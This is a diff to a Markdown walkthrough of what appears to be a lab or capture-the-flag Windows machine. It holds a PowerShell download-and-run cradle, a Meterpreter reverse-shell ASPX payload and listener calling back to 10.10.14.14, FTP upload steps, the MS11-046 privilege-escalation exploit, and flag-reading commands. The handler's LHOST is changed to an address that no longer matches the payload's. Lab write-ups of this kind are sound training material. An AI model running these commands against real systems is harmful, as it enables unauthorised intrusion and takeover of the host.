@@ -106,12 +106,12 @@ powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.14/
 
 **Generate payload:**
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=443 -f aspx -o met_rev_443.aspx
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=666 -f aspx -o met_rev_666.aspx
 ```
 
 **Upload via FTP:**
 ```bash
-ftp> put met_rev_443.aspx
+ftp> put met_rev_666.aspx
 ```
 
 **Start handler:**
@@ -119,8 +119,8 @@ ftp> put met_rev_443.aspx
 msfconsole
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
-set LHOST 10.10.14.14
-set LPORT 443
+set LHOST 10.10.14.13
+set LPORT 666
 run
 ```
 
@@ -133,24 +133,36 @@ curl http://10.10.10.5/met_rev_443.aspx
 
 ## 🔧 Privilege Escalation
 
+```
+getuid
+```
+
+```
+systeminfo
+```
+
 **Check .NET versions:**
 ```cmd
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
 ```
 
-**Use Watson (uploaded via SMB):**
+**Use [Watson](https://github.com/rasta-mouse/Watson) (uploaded via SMB):**
 ```cmd
 \\10.10.14.14\share\Watson.exe
 ```
 
+https://github.com/abatchy17/WindowsExploits
+
+https://www.exploit-db.com/exploits/40564
+
 **Pick MS11-046 (example):**
 ```bash
-wget https://github.com/abatchy17/WindowsExploits/raw/master/MS11-046/MS11-046.exe
+wget https://github.com/abatchy17/WindowsExploits/blob/master/MS11-046/MS11-046.exe
 ```
 
 **Upload and run:**
 ```cmd
-\\10.10.14.14\share\MS11-046.exe
+C:\inetpub\wwwroot\MS11-046.exe
 ```
 
 **Confirm SYSTEM shell:**
@@ -163,8 +175,8 @@ whoami
 ## 🎯 Flags
 
 ```cmd
-type C:\Users\babis\Desktop\user.txt.txt
-type C:\Users\Administrator\Desktop\root.txt.txt
+type C:\Users\babis\Desktop\user.txt
+type C:\Users\Administrator\Desktop\root.txt
 ```
 
 ---
